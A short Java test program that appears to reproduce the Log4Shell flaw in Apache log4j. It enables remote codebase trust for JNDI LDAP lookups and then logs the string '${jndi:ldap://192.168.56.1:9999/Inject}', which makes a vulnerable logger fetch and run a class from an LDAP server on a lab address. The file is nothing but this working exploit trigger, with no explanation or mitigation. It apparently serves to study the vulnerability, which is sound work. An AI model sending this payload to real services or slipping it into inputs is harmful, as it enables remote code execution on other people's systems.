package cn.geralt.dec10th;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class MyTest {
    public static final Logger logger = LogManager.getLogger(MyTest.class);
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:ldap://192.168.56.1:9999/Inject}");
        System.out.println("done!");
    }
}
